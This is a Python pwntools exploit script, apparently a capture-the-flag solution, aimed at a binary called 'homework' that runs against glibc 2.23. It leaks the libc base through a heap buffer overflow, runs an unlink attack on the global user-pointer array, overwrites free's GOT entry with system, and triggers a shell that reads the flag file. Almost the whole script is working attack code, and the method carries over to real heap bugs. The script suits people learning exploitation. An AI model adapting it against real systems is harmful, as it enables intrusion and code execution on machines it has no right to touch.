#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host homework --port 1337 ./homework
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './homework')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'homework'
port = int(args.PORT or 1337)

# Use the specified remote libc version unless explicitly told to use the
# local system version with the `LOCAL_LIBC` argument.
# ./exploit.py LOCAL LOCAL_LIBC
if args.LOCAL_LIBC:
    libc = exe.libc
elif args.LOCAL:
    library_path = libcdb.download_libraries('libc-2.23.so')
    if library_path:
        exe = context.binary = ELF.patch_custom_libraries(exe.path, library_path)
        libc = exe.libc
    else:
        libc = ELF('libc-2.23.so')
else:
    libc = ELF('libc-2.23.so')

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug(["./ld-2.23.so", "--library-path", ".", exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process(["./ld-2.23.so", "--library-path", ".", exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break free
continue
'''.format(**locals())

'''
set disable-randomization on
tbreak *0x{exe.entry:x}
'''

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)

def select_option(option, wait=True):
    if wait:
        io.recvuntil(b"Choice: ")
    io.sendline(str(option).encode())
    
def register_user(username, password, wait=True):
    select_option(0, wait=wait) 
    io.recvuntil(b"username: ")
    io.sendline(username)
    io.recvuntil(b"password: ")
    io.sendline(password)
    
def switch_user(index, wait=True):
    select_option(1, wait=wait) 
    io.recvuntil(b"[0-15]: ")
    io.sendline(index)
    
def delete_user(wait=True):
    select_option(4, wait=wait)
    
def edit_user(newName, newPassword, wait=True):
    select_option(2, wait=wait)
    io.recvuntil(b"new name: ")
    io.sendline(newName)
    io.recvuntil(b"new password: ")
    io.sendline(newPassword)

def show_user(wait=True):
    select_option(3, wait=wait)
    
def extract_pie_base(addr_text_str):
    match = re.search(b'A([^\nA]+)\n', addr_text_str)
    print(match)
    if not match:
        print("Couldn't extract pie base address")
        #exit(1)
        return 0
    extracted_string = match.group(1)
    print(extracted_string)
    return u64(extracted_string.ljust(8, b'\x00'))


# contig and execution
context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'debug'
context.arch = 'amd64'
context.bits = 64
io = start()

# register and login
username = b"user1"
password = b"pass1"
register_user(username, password)
username = b"user2"
password = b"pass2"
register_user(username, password)
username = b"user3"
password = b"pass3"
register_user(username, password)
username = b"user4"
password = b"pass4"
register_user(username, password)
username = b"user5"
password = b"pass5"
register_user(username, password)
username = b"user6"
password = b"pass6"
register_user(username, password)
username = b"user7"
password = b"pass7"
register_user(username, password)
username = b"user8"
password = b"pass8"
register_user(username, password)
username = b"user9"
password = b"pass9"
register_user(username, password)

# leak libc base
switch_user(b'1')
delete_user()
# now there a two libc pointers in the chunk of user2
# use buffer overflow in user1 to get libc leak
switch_user(b'0')
attack = b'A' * 0x50 #b'/bin/sh' + b'\x00' 
edit_user(b'user1', attack)
show_user()
raw_leak = io.recvuntil(b"Choice: ")
leak_add = extract_pie_base(raw_leak)
libc_base = leak_add - 0x3C4B78
#print(hex(libc_base))
log.info('Leaked libc base: {}'.format(hex(libc_base)))

# because of no PIE, static addresses
pie_base = 0x400000
start_user_pointer_array = 0x6020c0

# do unlink exploit
# configure user5 for exploit
switch_user(b'5', wait=False)
glob_user5_ptr = start_user_pointer_array + 0x28
fd_bk_ptr = p64(glob_user5_ptr - 0x18) + p64(glob_user5_ptr - 0x10)
fake_user = 0x10 * b'\x00' + fd_bk_ptr
fake_passwd = 0x40 * b'\x00' + p64(0x80) + p64(0x90)
edit_user(fake_user, fake_passwd)
# trigger exploit
switch_user(b'6', wait=False)
delete_user()


# overwrite got
free_got = exe.got['free']
system_addr = libc_base + libc.symbols['system'] #0x453a0 #
switch_user(b'5')
edit_user(p64(free_got), b'')
#print(hex(system_addr))
log.info('Use system address: {}'.format(hex(system_addr)))
switch_user(b'2')
sys_shortened = system_addr.to_bytes(8, 'little').rstrip(b'\x00') #p64(system_addr) + p64(libc_base + 0x6f6a0)
other_got_entry = libc_base + 0x36e90
other_shortened = other_got_entry.to_bytes(8, 'little').rstrip(b'\x00')
edit_user(sys_shortened, other_shortened)

# trigger system call
switch_user(b'0')
edit_user(b"/bin/sh", 0x40 * b'A' + 0x8 * b'\x00' + p64(0x91))
delete_user()

# run commands
io.sendline(b'cat flag.txt')
flag = io.recvuntil(b"flag}\n")
match = re.search(rb'SSL\{(.*?)\}', flag)
if match:
    print(match.group(1).decode())

#io.interactive()